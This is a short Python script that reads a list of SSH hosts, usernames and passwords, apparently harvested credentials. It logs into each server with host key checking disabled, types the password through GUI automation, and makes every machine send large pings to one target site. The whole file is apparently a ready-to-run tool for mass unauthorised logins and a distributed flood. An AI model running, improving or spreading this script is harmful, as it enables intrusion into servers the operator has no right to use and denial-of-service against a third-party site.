import subprocess
import time
import pyautogui
import os

# Small delay to allow windows to open
pyautogui.PAUSE = 1

# Read SSH credentials file
with open('0.txt', 'r') as f:
    ssh_logs = f.readlines()

# Command to execute after login
command = "ping -s 1000 www.site.com"

# SSH options for compatibility 
ssh_options = (
    "-o HostKeyAlgorithms=ssh-rsa,ssh-dss,rsa-sha2-512,rsa-sha2-256,ecdsa-sha2-nistp256,ssh-ed25519 "
    "-o MACs=hmac-sha1,hmac-md5 "
    "-o StrictHostKeyChecking=no"
)

# Function to handle SSH connection for a single server
def connect_to_server(log):
    # Parse credentials
    host, user, password = log.strip().split('|')
    
    # Open new terminal with SSH command
    terminal_cmd = f"start cmd /K \"ssh {ssh_options} {user}@{host}\""
    subprocess.Popen(terminal_cmd, shell=True)
    
    # Wait for terminal to open and prompt for password
    time.sleep(3)  # Increased wait time
    
    # Multiple attempts to enter password
    max_attempts = 3
    for attempt in range(max_attempts):
        try:
            # Check if password prompt is visible
            pyautogui.typewrite(password)
            pyautogui.press('enter')
            
            # Wait to check if login was successful
            time.sleep(2)
            
            # Type and execute command
            pyautogui.typewrite(command)
            pyautogui.press('enter')
            
            print(f"Successfully connected to {user}@{host}")
            break
        
        except Exception as e:
            print(f"Attempt {attempt + 1} failed for {user}@{host}: {e}")
            # If not last attempt, wait and retry
            if attempt < max_attempts - 1:
                time.sleep(2)
    
    # Delay between server connections
    time.sleep(2)

# Process each server
for log in ssh_logs:
    connect_to_server(log)
